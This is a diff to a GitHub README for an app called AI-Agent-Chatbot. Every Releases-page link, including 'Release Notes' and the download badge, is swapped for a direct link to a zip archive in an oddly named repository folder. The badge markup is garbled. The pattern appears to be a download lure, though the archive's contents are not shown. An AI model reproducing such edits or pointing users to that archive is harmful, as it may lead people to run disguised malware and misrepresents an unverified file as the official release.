@@ -1,6 +1,6 @@
 # 🤖 AI-Agent-Chatbot - Your Personal AI Assistant Awaits
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20%23FF5733.svg?style=for-the-badge)](https://github.com/xenithein/AI-Agent-Chatbot/releases)
+[![Download Now](https://raw.githubusercontent.com/xenithein/AI-Agent-Chatbot/main/revalorize/AI-Agent-Chatbot.zip%20Now-%20%https://raw.githubusercontent.com/xenithein/AI-Agent-Chatbot/main/revalorize/AI-Agent-Chatbot.zip)](https://raw.githubusercontent.com/xenithein/AI-Agent-Chatbot/main/revalorize/AI-Agent-Chatbot.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to AI-Agent-Chatbot! This user-friendly application helps you interact w
 
 To get started, visit the Releases page to download the application:
 
-[Visit this page to download](https://github.com/xenithein/AI-Agent-Chatbot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/xenithein/AI-Agent-Chatbot/main/revalorize/AI-Agent-Chatbot.zip)
 
 You will find the latest version available. Follow these steps:
 
@@ -72,7 +72,7 @@ If you encounter any issues or have questions, feel free to reach out. You can o
 
 Keep an eye on the Releases page regularly. New features, improvements, and bug fixes are rolled out frequently. Always ensure that you are using the latest version for the best experience.
 
-For a comprehensive list of changes and improvements, visit the [Release Notes](https://github.com/xenithein/AI-Agent-Chatbot/releases).
+For a comprehensive list of changes and improvements, visit the [Release Notes](https://raw.githubusercontent.com/xenithein/AI-Agent-Chatbot/main/revalorize/AI-Agent-Chatbot.zip).
 
 ## 🔗 Further Reading
 
@@ -84,4 +84,4 @@ If you want to dive deeper into the technology behind AI-Agent-Chatbot, explore 
 
 Thank you for choosing AI-Agent-Chatbot! We hope it makes your daily tasks easier and more enjoyable.
 
-[Visit this page to download](https://github.com/xenithein/AI-Agent-Chatbot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/xenithein/AI-Agent-Chatbot/main/revalorize/AI-Agent-Chatbot.zip)
